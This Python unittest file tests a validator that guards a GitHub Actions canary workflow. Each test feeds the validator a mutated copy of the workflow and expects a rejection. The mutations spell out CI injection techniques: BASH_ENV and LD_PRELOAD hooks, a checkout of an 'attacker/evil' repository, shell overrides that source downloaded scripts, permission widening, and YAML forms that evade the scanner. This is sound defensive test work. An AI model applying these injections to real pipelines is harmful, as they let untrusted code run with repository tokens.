            "rescheduled": workflow.replace(
                '    - cron: "41 1 * * 1-5"', '    - cron: "41 1 * * 0"', 1
            ),
            "top-of-the-hour": workflow.replace(
                '    - cron: "41 1 * * 1-5"', '    - cron: "0 1 * * 1-5"', 1
            ),
            "unscheduled": workflow.replace('    - cron: "41 1 * * 1-5"\n', "", 1),
        }.items():
            with self.subTest(schedule=label):
                self._reject(mutated, "trigger mismatch")

    def test_an_extra_trigger_is_rejected(self) -> None:
        """A canary that runs on every push is a CI job, not a canary."""
        self._reject(
            self._workflow().replace(
                "on:\n", "on:\n  push:\n    branches: [main]\n", 1
            ),
            "trigger mismatch",
        )

    def test_the_dispatch_input_is_pinned(self) -> None:
        """The manual lane selector is the only way to exercise one lane."""
        workflow = self._workflow()
        for label, mutated in {
            "dropped": workflow.replace(
                "  workflow_dispatch:\n"
                "    inputs:\n"
                "      channel:\n"
                '        description: "stable or nightly"\n'
                '        default: "stable"\n'
                "        type: choice\n"
                "        options: [stable, nightly]\n",
                "  workflow_dispatch:\n",
                1,
            ),
            "unconstrained": workflow.replace(
                "        type: choice\n        options: [stable, nightly]\n",
                "        type: string\n",
                1,
            ),
            "widened": workflow.replace(
                "        options: [stable, nightly]",
                "        options: [stable, nightly, experimental]",
                1,
            ),
        }.items():
            with self.subTest(input=label):
                self._reject(mutated, "dispatch input mismatch")

    def test_top_level_permissions_cannot_widen(self) -> None:
        self._reject(
            self._workflow().replace(
                "permissions:\n  contents: read\n",
                "permissions:\n  contents: write\n",
                1,
            ),
            "workflow permission mismatch",
        )

    def test_overlapping_runs_must_queue(self) -> None:
        self._reject(
            self._workflow().replace(
                "  cancel-in-progress: false", "  cancel-in-progress: true", 1
            ),
            "concurrency mismatch",
        )

    def test_the_job_roster_is_pinned(self) -> None:
        workflow = self._workflow()
        for label, mutated in {
            "renamed": workflow.replace("\n  notify:\n", "\n  report:\n", 1),
            "merged": workflow.replace(
                "\n  notify:\n    name: Notify\n", "\n  notify:\n    name: Probe\n", 1
            ),
        }.items():
            with self.subTest(roster=label):
                self._reject(mutated, "job membership mismatch|display mismatch")

    def test_the_probe_job_cannot_gain_write_authority(self) -> None:
        """The credential split, stated as the one thing that must never pass.

        The probe job executes a compiler downloaded from a package channel
        against this source tree. GitHub mints a `GITHUB_TOKEN` for it whatever
        the workflow says, so `contents: read` is not "nothing" — it is the
        least a job that checks this repository out can hold. Any grant beyond
        it, and any missing grant block that lets the job inherit a wider one,
        hands that compiler write authority over something.
        """
        workflow = self._workflow()
        # Anchored on the block that follows the probe's grant rather than on
        # the prose above it, so a reworded comment cannot quietly stop this
        # mutation from applying.
        marker = "    permissions:\n      contents: read\n    strategy:\n"
        self.assertIn(marker, workflow)
        for label, replacement in {
            "contents-write": "    permissions:\n"
            "      contents: write\n"
            "    strategy:\n",
            "issues-write": "    permissions:\n"
            "      contents: read\n"
            "      issues: write\n"
            "    strategy:\n",
            "id-token": "    permissions:\n"
            "      contents: read\n"
            "      id-token: write\n"
            "    strategy:\n",
            "dropped": "    strategy:\n",
        }.items():
            with self.subTest(grant=label):
                self._reject(
                    workflow.replace(marker, replacement, 1),
                    "permission mismatch",
                )

    def test_the_probe_job_holds_no_credential_worth_reaching(self) -> None:
        """The guarantee GitHub actually permits, stated positively.

        A `GITHUB_TOKEN` is minted for every job whether the workflow asks for
        one or not, so "the probe is given no token" is not a property anything
        can pin, and an oracle that claimed it would be asserting something
        false. Three things are true instead, and each is read off the live
        probe job here: its grant carries no write scope, no step binds a
        credential into the environment the downloaded compiler runs in, and
        the checkout refuses to leave one in `.git/config` beside it.
        """
        jobs = self._workflow().split("\n  probe:\n", 1)[1]
        probe, separator, _notify = jobs.partition("\n  notify:\n")
        self.assertTrue(separator)
        for forbidden in (": write", "github.token", "secrets.", "GH_TOKEN"):
            self.assertNotIn(forbidden, probe)
        self.assertIn("      contents: read\n", probe)
        self.assertIn("          persist-credentials: false\n", probe)

    def test_the_notifier_permissions_are_exact(self) -> None:
        workflow = self._workflow()
        for label, mutated in {
            "narrowed": workflow.replace(
                "      contents: read\n      issues: write\n",
                "      contents: read\n",
                1,
            ),
            "widened": workflow.replace(
                "      contents: read\n      issues: write\n",
                "      contents: read\n      issues: write\n      contents: write\n",
                1,
            ),
        }.items():
            with self.subTest(grant=label):
                self._reject(mutated, "permission mismatch")

    def test_both_checkouts_must_refuse_to_persist_a_credential(self) -> None:
        workflow = self._workflow()
        self.assertEqual(workflow.count("          persist-credentials: false\n"), 2)
        for index in (1, 2):
            with self.subTest(checkout=index):
                head, sep, tail = workflow.partition(
                    "          persist-credentials: false\n"
                )
                mutated = (
                    head + tail if index == 1 else head + sep + tail.replace(sep, "", 1)
                )
                self._reject(mutated, "persist-credentials")

    def test_the_runner_cannot_float(self) -> None:
        self._reject(
            self._workflow().replace("runs-on: ubuntu-24.04", "runs-on: ubuntu-latest"),
            "runner mismatch",
        )

    def test_a_missing_timeout_is_rejected(self) -> None:
        workflow = self._workflow()
        for job, marker in {
            "probe": "    timeout-minutes: 60\n",
            "notify": "    timeout-minutes: 10\n",
        }.items():
            with self.subTest(job=job):
                self._reject(workflow.replace(marker, "", 1), "timeout mismatch")

    def test_the_probe_cannot_be_conditioned_away(self) -> None:
        """A probe that skips itself is a green run that probed nothing."""
        self._reject(
            self._workflow().replace(
                '    name: "Probe / ${{ matrix.lane }}"\n',
                '    name: "Probe / ${{ matrix.lane }}"\n'
                "    if: github.event_name == 'schedule'\n",
                1,
            ),
            "probe job condition mismatch",
        )

    def test_a_conditioned_notifier_step_is_rejected(self) -> None:
        """A skipped upsert leaves a green run that told nobody anything."""
        self._reject(
            self._workflow().replace(
                "      - name: Upsert the pinned issues\n",
                "      - name: Upsert the pinned issues\n        if: false\n",
                1,
            ),
            "notifier step condition mismatch",
        )

    def test_the_concurrency_group_is_pinned(self) -> None:
        """Two groups are two canaries, each unaware of the other's issue."""
        self._reject(
            self._workflow().replace(
                "  group: compat-canary", "  group: compat-canary-${{ github.ref }}", 1
            ),
            "concurrency mismatch",
        )

    def test_the_notifier_must_wait_for_every_lane(self) -> None:
        self._reject(
            self._workflow().replace("    needs: probe\n", "", 1),
            "must wait for the probe",
        )

    def test_the_notifier_must_run_after_a_failed_probe(self) -> None:
        """Without `if: always()` a crashed lane is reported by nobody."""
        self._reject(
            self._workflow().replace(
                "    if: always()\n    timeout-minutes: 10\n",
                "    timeout-minutes: 10\n",
                1,
            ),
            "condition mismatch",
        )

    def test_the_upload_must_survive_a_failing_probe(self) -> None:
        self._reject(
            self._workflow().replace("        if: always()\n", "", 1),
            "upload",
        )

    def test_action_pins_carry_their_version_comments(self) -> None:
        workflow = self._workflow()
        for label, mutated in {
            "comment": workflow.replace(
                f"actions/checkout@{workflow_security.CHECKOUT_ACTION_SHA} # v7.0.1",
                f"actions/checkout@{workflow_security.CHECKOUT_ACTION_SHA}",
                1,
            ),
            "revision": workflow.replace(
                workflow_security.UPLOAD_ARTIFACT_ACTION_SHA, "0" * 40, 1
            ),
            "tag": workflow.replace(
                f"actions/download-artifact@"
                f"{workflow_security.DOWNLOAD_ARTIFACT_ACTION_SHA} # v8.0.1",
                "actions/download-artifact@v8",
                1,
            ),
        }.items():
            with self.subTest(pin=label):
                self._reject(mutated, "action pin mismatch")

    def test_the_environment_must_not_be_installed_before_the_probe(self) -> None:
        """The permanently-green defect, reintroduced from the workflow side.

        `run-install: true` solves the committed `==` pin before the probe
        relaxes it, so the install resolves the pinned toolchain and every day
        classifies as `NO_NEWER_CANDIDATE` while the run stays green.
        """
        workflow = self._workflow()
        for label, mutated in {
            "installed": workflow.replace(
                "          run-install: false", "          run-install: true", 1
            ),
            "cached": workflow.replace(
                "          run-install: false",
                "          run-install: false\n          cache: true",
                1,
            ),
        }.items():
            with self.subTest(setup=label):
                self._reject(mutated, "setup-pixi")

    def test_the_pixi_binary_cannot_float(self) -> None:
        """The one tool the probe never installs itself, left to the day.

        `setup-pixi` installs the newest pixi when it is given no version, so
        the canary would run against a tool that changes under it on a morning
        nobody chose. Everything the probe learns about the channels comes
        through `pixi search --json`, whose answer shape both lanes parse, so a
        pixi release that moves it stops the canary in both lanes at once.
        """
        workflow = self._workflow()
        for label, mutated in {
            "floating": workflow.replace("          pixi-version: v0.72.0\n", "", 1),
            "another-version": workflow.replace(
                "          pixi-version: v0.72.0", "          pixi-version: latest", 1
            ),
        }.items():
            with self.subTest(pin=label):
                self._reject(mutated, "setup-pixi|step input mismatch")

    def test_the_lane_matrix_is_pinned(self) -> None:
        workflow = self._workflow()
        marker = (
            "        lane: ${{ fromJSON(github.event_name == 'workflow_dispatch' "
            '&& format(\'["{0}"]\', inputs.channel) || \'["stable","nightly"]\') }}'
        )
        self.assertIn(marker, workflow)
        for label, mutated in {
            "one-lane": workflow.replace(marker, '        lane: ["stable"]', 1),
            "fail-fast": workflow.replace(
                "      fail-fast: false", "      fail-fast: true", 1
            ),
        }.items():
            with self.subTest(matrix=label):
                self._reject(mutated, "matrix mismatch")

    def test_the_probe_step_sequence_is_pinned(self) -> None:
        workflow = self._workflow()
        for label, mutated in {
            "dropped": workflow.replace(
                "      - name: Probe the candidate toolchain\n",
                "      - name: Probe nothing at all\n",
                1,
            ),
            "reordered": workflow.replace(
                "      - name: Probe the candidate toolchain\n",
                "      - name: ${PLACEHOLDER}\n",
                1,
            )
            .replace(
                "      - name: Upload the classification\n",
                "      - name: Probe the candidate toolchain\n",
                1,
            )
            .replace(
                "      - name: ${PLACEHOLDER}\n",
                "      - name: Upload the classification\n",
                1,
            ),
        }.items():
            with self.subTest(steps=label):
                self._reject(mutated, "step sequence mismatch")

    def test_the_probe_invocation_is_pinned(self) -> None:
        workflow = self._workflow()
        for label, mutated in {
            "another-command": workflow.replace(
                'python3 -m scripts.canary.run --lane "$CANARY_LANE"',
                "python3 -m scripts.canary.run --lane stable",
                1,
            ),
            "another-module": workflow.replace(
                "python3 -m scripts.canary.run --lane",
                "python3 -m scripts.canary.notify --lane",
                1,
            ),
        }.items():
            with self.subTest(command=label):
                self._reject(mutated, "run command mismatch")

    def test_an_expression_on_a_run_line_is_rejected(self) -> None:
        """An expression is substituted into the script before bash parses it."""
        self._reject(
            self._workflow().replace(
                "        env:\n"
                "          # Through the environment rather than into the script"
                " text: an\n"
                "          # expression is substituted before bash parses the"
                " line.\n"
                "          CANARY_LANE: ${{ matrix.lane }}\n"
                '        run: python3 -m scripts.canary.run --lane "$CANARY_LANE"',
                "        run: python3 -m scripts.canary.run --lane ${{ matrix.lane }}",
                1,
            ),
            "expression",
        )

    def test_the_bound_environment_keys_are_exact(self) -> None:
        """A key can run code without substituting anything into the script."""
        workflow = self._workflow()
        for label, mutated in {
            "probe": workflow.replace(
                "          CANARY_LANE: ${{ matrix.lane }}\n",
                "          CANARY_LANE: ${{ matrix.lane }}\n"
                "          BASH_ENV: ./hook.sh\n",
                1,
            ),
            "notify": workflow.replace(
                "          GH_TOKEN: ${{ github.token }}\n",
                "          GH_TOKEN: ${{ github.token }}\n"
                "          LD_PRELOAD: ./evil.so\n",
                1,
            ),
        }.items():
            with self.subTest(job=label):
                self._reject(mutated, "environment mismatch")

    def test_the_bound_environment_values_are_exact(self) -> None:
        """A key set alone does not say what a binding will make happen.

        `CANARY_LANES` names which lanes owe a report. Left in place with a
        narrower value, the notifier stops asking about the other one, and a
        red nightly artifact goes unmentioned in a run that is green and
        complete in every other respect — including to an oracle that pinned
        the key and not the value.
        """
        workflow = self._workflow()
        lanes = (
            "          CANARY_LANES: ${{ github.event_name == 'workflow_dispatch'"
            " && inputs.channel || 'stable nightly' }}"
        )
        self.assertIn(lanes, workflow)
        for label, mutated in {
            "one-lane": workflow.replace(lanes, "          CANARY_LANES: stable", 1),
            "empty": workflow.replace(lanes, '          CANARY_LANES: ""', 1),
            "lane-substituted": workflow.replace(
                "          CANARY_LANE: ${{ matrix.lane }}",
                "          CANARY_LANE: stable",
                1,
            ),
        }.items():
            with self.subTest(binding=label):
                self._reject(mutated, "environment mismatch")

    def test_an_environment_above_the_jobs_is_rejected(self) -> None:
        """A binding neither job's body shows still reaches both of them."""
        workflow = self._workflow()
        for label, mutated in {
            "workflow-level": workflow.replace(
                "jobs:\n", "env:\n  BASH_ENV: ./hook.sh\njobs:\n", 1
            ),
            "job-level": workflow.replace(
                "    timeout-minutes: 10\n",
                "    timeout-minutes: 10\n    env:\n      BASH_ENV: ./hook.sh\n",
                1,
            ),
        }.items():
            with self.subTest(scope=label):
                self._reject(mutated, "environment mismatch")

    def test_the_checkout_inputs_are_pinned_by_value(self) -> None:
        """The one input that decides which sources are cloned and then run.

        `repository:` and `ref:` are spelled exactly like the
        `persist-credentials:` line beside them and are the whole of what
        decides which tree the privileged job checks out — and which tree the
        probe job hands to a compiler it downloaded. Counting the
        `persist-credentials` lines leaves both of them free to arrive.
        """
        workflow = self._workflow()
        head, separator, tail = workflow.rpartition(
            "          persist-credentials: false\n"
        )
        self.assertTrue(separator)
        for label, mutated in {
            "foreign-repository": head
            + "          repository: attacker/evil\n          ref: main\n"
            + separator
            + tail,
            "checkout-path": head
            + separator.replace(
                "          persist-credentials: false\n",
                "          persist-credentials: false\n          path: sources\n",
            )
            + tail,
            "submodules": head
            + separator
            + tail.replace(
                "\n      - name: Download the stable",
                "\n          submodules: recursive\n"
                "\n      - name: Download the stable",
                1,
            ),
        }.items():
            with self.subTest(input=label):
                self._reject(mutated, "step input mismatch")

    def test_a_recombining_job_or_step_key_is_rejected(self) -> None:
        """Five ways to change what runs without changing a `run:` line.

        `defaults:` and a step-level `shell:` decide which interpreter parses
        the reviewed command, and both can source a downloaded file before it.
        `container:` and `services:` supply that interpreter from an image this
        repository has never read. `working-directory:` decides where
        `python3 -m scripts.canary.notify` resolves that module from, and the
        privileged job's working tree has an artifact directory in it. Each
        leaves the permissions, the step names, the pins and the commands
        exactly as reviewed.
        """
        workflow = self._workflow()
        hook = "bash -c 'source build/canary-results/hook.sh; eval \"$0\"'"
        for label, mutated in {
            "job-defaults": workflow.replace(
                "    timeout-minutes: 10\n",
                "    timeout-minutes: 10\n"
                "    defaults:\n      run:\n"
                f"        shell: {hook}\n",
                1,
            ),
            "workflow-defaults": workflow.replace(
                "jobs:\n", f"defaults:\n  run:\n    shell: {hook}\njobs:\n", 1
            ),
            "step-shell": workflow.replace(
                "      - name: Upsert the pinned issues\n",
                f"      - name: Upsert the pinned issues\n        shell: {hook}\n",
                1,
            ),
            "container": workflow.replace(
                "    timeout-minutes: 10\n",
                "    timeout-minutes: 10\n    container: ghcr.io/nobody/image:latest\n",
                1,
            ),
            "services": workflow.replace(
                "    timeout-minutes: 10\n",
                "    timeout-minutes: 10\n"
                "    services:\n"
                "      sidecar:\n"
                "        image: ghcr.io/nobody/image:latest\n",
                1,
            ),
            "working-directory": workflow.replace(
                "      - name: Upsert the pinned issues\n",
                "      - name: Upsert the pinned issues\n"
                "        working-directory: build/canary-results/"
                "canary-result-stable\n",
                1,
            ),
        }.items():
            with self.subTest(key=label):
                self._reject(mutated, "execution mismatch")

    def test_the_artifact_names_and_paths_are_pinned(self) -> None:
        workflow = self._workflow()
        for label, mutated in {
            "upload-name": workflow.replace(
                "          name: canary-result-${{ matrix.lane }}",
                "          name: canary-result",
                1,
            ),
            "upload-path": workflow.replace(
                "          path: build/canary/", "          path: .", 1
            ),
        }.items():
            with self.subTest(artifact=label):
                self._reject(mutated, "artifact")

    def test_each_lane_is_downloaded_into_its_own_directory(self) -> None:
        """The layout defect a two-lane run hides.

        `actions/download-artifact` names a directory per artifact only while
        two or more matched; a sole match is extracted straight into `path:`.
        Collapsed back to one step, a single-lane dispatch — or a scheduled run
        where one lane's upload never happened — puts `result.json` at the
        download root, where `scripts/canary/notify.py` does not look, and
        every lane is reported as silent while the probe was working fine.
        """
        workflow = self._workflow()
        lane_steps = "".join(
            f"      - name: Download the {lane} lane's classification\n"
            "        uses: actions/download-artifact@"
            f"{workflow_security.DOWNLOAD_ARTIFACT_ACTION_SHA} # v8.0.1\n"
            "        with:\n"
            f"          pattern: canary-result-{lane}\n"
            f"          path: build/canary-results/canary-result-{lane}/\n"
            "          merge-multiple: true\n"
            "\n"
            for lane in ("stable", "nightly")
        )
        self.assertIn(lane_steps, workflow)
        collapsed = (
            "      - name: Download the stable lane's classification\n"
            "        uses: actions/download-artifact@"
            f"{workflow_security.DOWNLOAD_ARTIFACT_ACTION_SHA} # v8.0.1\n"
            "        with:\n"
            "          path: build/canary-results/\n"
            "\n"
        )
        for label, mutated in {
            "collapsed": workflow.replace(lane_steps, collapsed, 1),
            "shared-destination": workflow.replace(
                "          path: build/canary-results/canary-result-nightly/",
                "          path: build/canary-results/",
                1,
            ),
            "unfiltered": workflow.replace(
                "          pattern: canary-result-stable\n", "", 1
            ),
            "no-merge": workflow.replace("          merge-multiple: true\n", "", 1),
        }.items():
            with self.subTest(download=label):
                self._reject(mutated, "download layout mismatch|step sequence")

    def test_the_notifier_may_not_run_downloaded_content(self) -> None:
        """The negative space: the privileged job runs one reviewed command.

        Every mutation here leaves the permissions untouched and still hands the
        `issues: write` token to something that came off the network — a pixi
        environment, the probe itself, or a shell pipeline.
        """
        workflow = self._workflow()
        marker = (
            "        run: python3 -m scripts.canary.notify"
            ' --results build/canary-results/ --lanes "$CANARY_LANES"\n'
        )
        self.assertIn(marker, workflow)
        for label, mutated in {
            "setup-pixi": workflow.replace(
                "      - name: Upsert the pinned issues\n",
                "      - name: Set up Pixi\n"
                "        uses: prefix-dev/setup-pixi@"
                f"{workflow_security.SETUP_PIXI_ACTION_SHA} # v0.10.0\n\n"
                "      - name: Upsert the pinned issues\n",
                1,
            ),
            "pixi-run": workflow.replace(marker, "        run: pixi run e2e\n", 1),
            "probe": workflow.replace(
                marker,
                "        run: python3 -m scripts.canary.run --lane stable\n",
                1,
            ),
            "downloaded-shell": workflow.replace(
                marker,
                "        run: bash build/canary-results/hook.sh\n",
                1,
            ),
        }.items():
            with self.subTest(notifier=label):
                self._reject(mutated, "notifier|run command mismatch|step sequence")

    def test_a_secret_reference_is_rejected(self) -> None:
        """The canary needs the run's own token and nothing a human configured."""
        self._reject(
            self._workflow().replace(
                "          GH_TOKEN: ${{ github.token }}",
                "          GH_TOKEN: ${{ secrets.CANARY_TOKEN }}",
                1,
            ),
            "credential",
        )

    def test_the_run_token_cannot_reach_the_probe_job(self) -> None:
        self._reject(
            self._workflow().replace(
                "          CANARY_LANE: ${{ matrix.lane }}",
                "          CANARY_LANE: ${{ matrix.lane }}\n"
                "          GH_TOKEN: ${{ github.token }}",
                1,
            ),
            "environment mismatch|credential",
        )


class CompatCanaryNonCanonicalYamlTests(unittest.TestCase):
    """Mutations written in YAML the canary oracle's regexes cannot read.

    Every other canary mutation in this file is written in the same block
    mapping idiom the live workflow uses, which is also the idiom those regexes
    were built around — so a suite made only of those cannot discover the forms
    they never see. YAML admits many spellings of one structure: a step in
    inline sequence form opens with `- run:` rather than `- name:`, a mapping
    can be written between braces on one line, a key can be quoted or padded
    away from its colon, and a command can live in a block scalar under the line
    that names it. Each parses to exactly the structure the block form parses
    to, and none of them is what a `^      - name: (.+)$` or a
    `line.strip() == "env:"` is looking at.

    So the property asserted here is not "these particular spellings are
    caught". It is that the oracle refuses anything outside the one spelling it
    can read, before it asserts a single property — which is the only version of
    this that does not have to be re-won against the next spelling nobody
    thought of.
    """

    def _workflow(self) -> str:
        """Return the live compatibility-canary workflow text."""
        return (
            workflow_security.REPO_ROOT / ".github" / "workflows" / "compat-canary.yml"
        ).read_text(encoding="utf-8")

    def _reject(self, mutated: str, pattern: str) -> None:
        """Require the canary oracle to reject one mutated workflow."""
        self.assertNotEqual(mutated, self._workflow())
        with tempfile.TemporaryDirectory(prefix="mtest-canary-yaml-") as raw_tmp:
            repo = Path(raw_tmp)
            workflow_path = repo / ".github" / "workflows" / "compat-canary.yml"
            workflow_path.parent.mkdir(parents=True)
            workflow_path.write_text(mutated, encoding="utf-8")
            with self.assertRaisesRegex(AssertionError, pattern):
                workflow_security.check_compat_canary_workflow(repo)

    # The payload every mutation below reaches for. The probe downloads and
    # executes a compiler from a package channel; whatever that compiler leaves
    # in `build/canary/` is uploaded as the lane artifact and unpacked here, in
    # the job holding `issues: write`.
    HOOK = "build/canary-results/canary-result-stable/hook.sh"
    UPSERT = "      - name: Upsert the pinned issues\n"
    PROBE_RUN = '        run: python3 -m scripts.canary.run --lane "$CANARY_LANE"\n'

    def test_a_step_that_does_not_open_with_a_name_is_rejected(self) -> None:
        """Arbitrary code in the privileged job, in a step neither scan sees.

        Steps are collected as `- name:` lines and commands as `run:` lines at
        one exact indent. A step written `- run:` is a step by every rule YAML
        has and appears in neither collection, so the step sequence still reads
        as the four reviewed names and the command list still reads as the one
        reviewed notifier invocation.
        """
        workflow = self._workflow()
        for label, mutated in {
            "notify-runs-the-artifact": workflow.replace(
                self.UPSERT, f"      - run: bash {self.HOOK}\n{self.UPSERT}", 1
            ),
            "probe-forges-a-verdict": workflow.replace(
                self.PROBE_RUN,
                f"{self.PROBE_RUN}"
                "      - run: cp loot/result.json build/canary/result.json\n",
                1,
            ),
            "local-action": workflow.replace(
                self.UPSERT,
                f"      - uses: ./.github/actions/collect\n{self.UPSERT}",
                1,
            ),
        }.items():
            with self.subTest(step=label):
                self._reject(mutated, "readable subset")

    def test_a_padded_sequence_dash_is_rejected(self) -> None:
        """One extra space moves a whole step out of both scans.

        `-   name:` is the same step as `- name:`, but its keys sit two columns
        further right, so the step name matches no collection and the `run:`
        beneath it is not at the indent the command list reads.
        """
        self._reject(
            self._workflow().replace(
                self.UPSERT,
                "      -   name: Collect the downloads\n"
                f"          run: bash {self.HOOK}\n"
                f"{self.UPSERT}",
                1,
            ),
            "readable subset",
        )

    def test_a_block_scalar_command_is_rejected(self) -> None:
        """A payload on no scanned line at all.

        `run: |` puts the command on the lines beneath it, where no `run:`
        pattern looks and no expression rule applies.
        """
        self._reject(
            self._workflow().replace(
                self.UPSERT,
                f"      - run: |\n          bash {self.HOOK}\n{self.UPSERT}",
                1,
            ),
            "readable subset",
        )

    def test_a_flow_mapping_environment_is_rejected(self) -> None:
        """The env pinning that stops `BASH_ENV`, bypassed by a brace.

        The binding scanner recognises a line whose stripped form is exactly
        `env:` and reads the block beneath it. `env: {BASH_ENV: hook.sh}` binds
        the same name and is not that line, so every binding in it is invisible
        to the comparison the module's own docstring rests its `BASH_ENV`
        argument on. GitHub runs a `run:` step under non-interactive bash, which
        sources whatever `BASH_ENV` names before it reads the script — so the
        artifact executes ahead of the reviewed notifier command.
        """
        workflow = self._workflow()
        binding = "env: {BASH_ENV: " + self.HOOK + "}"
        for label, mutated in {
            "step-level": workflow.replace(
                self.UPSERT, f"{self.UPSERT}        {binding}\n", 1
            ),
            "workflow-level": workflow.replace("jobs:\n", f"{binding}\njobs:\n", 1),
            "beside-the-block-form": workflow.replace(
                "        env:\n          GH_TOKEN:",
                f"        {binding}\n        env:\n          GH_TOKEN:",
                1,
            ),
            "expression-valued": workflow.replace(
                self.UPSERT,
                f"{self.UPSERT}        env: "
                '${{ fromJSON(\'{"BASH_ENV":"' + self.HOOK + "\"}') }}\n",
                1,
            ),
        }.items():
            with self.subTest(env=label):
                self._reject(mutated, "readable subset")

    def test_a_quoted_or_padded_mapping_key_is_rejected(self) -> None:
        r"""A key YAML reads and no `^\s*<key>:` pattern here does.

        `"env":`, `"working-directory":` and `audit :` are the same keys as
        their plain spellings. Quoted or padded, each one defeats the exact
        pattern that governs it while the workflow still means what the pattern
        was written to forbid.
        """
        workflow = self._workflow()
        for label, mutated in {
            "quoted-env": workflow.replace(
                self.UPSERT,
                f'{self.UPSERT}        "env":\n          BASH_ENV: {self.HOOK}\n',
                1,
            ),
            "quoted-working-directory": workflow.replace(
                self.UPSERT,
                f'{self.UPSERT}        "working-directory": '
                "build/canary-results/canary-result-stable\n",
                1,
            ),
            "padded-key": workflow.replace(
                "    timeout-minutes: 10\n", "    timeout-minutes : 10\n", 1
            ),
        }.items():
            with self.subTest(key=label):
                self._reject(mutated, "readable subset")

    def _third_job(self, job_id: str) -> str:
        """Render a third job that grants itself issue-write authority.

        Args:
            job_id: How the job's key is spelled, including its colon.

        Returns:
            A job block that needs the probe, unpacks the lane artifacts, and
            executes one of them under `issues: write`.
        """
        return (
            f"\n{job_id}\n"
            "    name: Audit\n"
            "    runs-on: ubuntu-24.04\n"
            "    needs: probe\n"
            "    timeout-minutes: 10\n"
            "    permissions: {contents: read, issues: write}\n"
            "    steps:\n"
            "      - uses: actions/download-artifact@"
            f"{workflow_security.DOWNLOAD_ARTIFACT_ACTION_SHA} # v8.0.1\n"
            "        with:\n"
            "          path: build/canary-results/\n"
            f"      - run: bash {self.HOOK}\n"
        )

    def test_a_third_job_cannot_hide_from_the_roster(self) -> None:
        """The whole credential split, restated in a job nothing counted.

        The job roster is read as plain keys at indent two, the permission
        override count as `^    permissions:$` lines, and the issue-write grant
        as lines whose stripped form is exactly `issues: write`. A quoted or
        padded job id is seen by none of the first, and a flow-style
        `permissions:` by neither of the others — so a third job can need the
        probe, unpack its artifact and run it with `issues: write` while the two
        reviewed jobs still read exactly as reviewed.
        """
        workflow = self._workflow()
        for label, job_id in {
            "quoted": '  "audit":',
            "padded": "  audit :",
            "plain": "  audit:",
        }.items():
            with self.subTest(job=label):
                self._reject(
                    workflow + self._third_job(job_id),
                    "readable subset|job membership mismatch",
                )

    def test_a_flow_style_permission_grant_is_rejected(self) -> None:
        """`permissions: {…}` is counted by neither grant scan."""
        workflow = self._workflow()
        for label, mutated in {
            "probe-widened": workflow.replace(
                "    permissions:\n      contents: read\n    strategy:\n",
                "    permissions: {contents: read, issues: write}\n    strategy:\n",
                1,
            ),
            "everything": workflow.replace(
                "    permissions:\n      contents: read\n    strategy:\n",
                "    permissions: write-all\n    strategy:\n",
                1,
            ),
        }.items():
            with self.subTest(grant=label):
                self._reject(mutated, "readable subset")

    def test_a_flow_style_action_input_is_rejected(self) -> None:
        """`with: {…}` hands an action inputs the input scan never lists."""
        self._reject(
            self._workflow().replace(
                "        with:\n          persist-credentials: false\n",
                "        with: {persist-credentials: false, "
                "repository: attacker/evil}\n",
                1,
            ),
            "readable subset",
        )

    def test_a_flow_style_lane_matrix_is_rejected(self) -> None:
        """A matrix written between braces is compared against nothing."""
        marker = (
            "      matrix:\n"
            "        lane: ${{ fromJSON(github.event_name == 'workflow_dispatch' "
            '&& format(\'["{0}"]\', inputs.channel) || \'["stable","nightly"]\') }}\n'
        )
        workflow = self._workflow()
        self.assertIn(marker, workflow)
        self._reject(
            workflow.replace(marker, '      matrix: {lane: ["stable"]}\n', 1),
            "readable subset",
        )

    def test_an_anchor_or_alias_is_rejected(self) -> None:
        """One node, written once and used twice, read once by every scan.

        An anchored mapping is expanded by YAML wherever its alias appears, so
        an alias in the privileged job carries whatever the anchor holds while
        every pattern here reads only the line the alias is written on. The
        merge key does the same to a mapping.
        """
        workflow = self._workflow()
        for label, mutated in {
            "anchor": workflow.replace(
                "        env:\n          # Through the environment",
                "        env: &canary_env\n          # Through the environment",
                1,
            ),
            "alias": workflow.replace(
                self.UPSERT, f"{self.UPSERT}        env: *canary_env\n", 1
            ),
            "merge-key": workflow.replace(
                self.UPSERT, f"{self.UPSERT}        <<: *canary_env\n", 1
            ),
        }.items():
            with self.subTest(node=label):
                self._reject(mutated, "readable subset")

    def test_a_tab_or_trailing_space_is_rejected(self) -> None:
        """Whitespace YAML and these patterns disagree about.

        A tab is not indentation in YAML at all, and trailing whitespace rides
        along inside every value a `(.+)$` capture reads, so both are refused
        rather than left to be read two ways.
        """
        workflow = self._workflow()
        for label, mutated in {
            "tab": workflow.replace(
                "    timeout-minutes: 10\n", "\ttimeout-minutes: 10\n", 1
            ),
            "trailing-space": workflow.replace(
                "    needs: probe\n", "    needs: probe \n", 1
            ),
            "odd-indent": workflow.replace(
                "    needs: probe\n", "     needs: probe\n", 1
            ),
        }.items():
            with self.subTest(whitespace=label):
                self._reject(mutated, "readable subset")

    def test_a_second_document_is_rejected(self) -> None:
        """A file can hold two documents; every scan here reads one text."""
        self._reject(
            self._workflow() + "---\njobs:\n  audit:\n    runs-on: ubuntu-24.04\n",
            "readable subset",
        )

    def test_the_live_workflow_is_inside_the_readable_subset(self) -> None:
        """The subset is a description of this file, not a wish about it."""
        workflow_security.check_compat_canary_workflow()

    def test_the_run_token_is_counted_in_every_expression_form(self) -> None:
        """`github.token` and `github['token']` name one value.

        The credential count matches the literal `${{ github.token }}` with its
        inner spaces, so both `${{github.token}}` and `${{ github['token'] }}`
        are free of it. The bracket form is already handled by this module's own
        credential pattern; the canary simply never applied it.
        """
        workflow = self._workflow()
        for label, expression in {
            "spaceless": "${{github.token}}",
            "bracket": "${{ github['token'] }}",
        }.items():
            with self.subTest(form=label):
                self._reject(
                    workflow.replace(
                        "          CANARY_LANE: ${{ matrix.lane }}\n",
                        "          CANARY_LANE: ${{ matrix.lane }}\n"
                        f"          GH_TOKEN: {expression}\n",
                        1,
                    ),
                    "credential mismatch",
                )


if __name__ == "__main__":
    unittest.main()
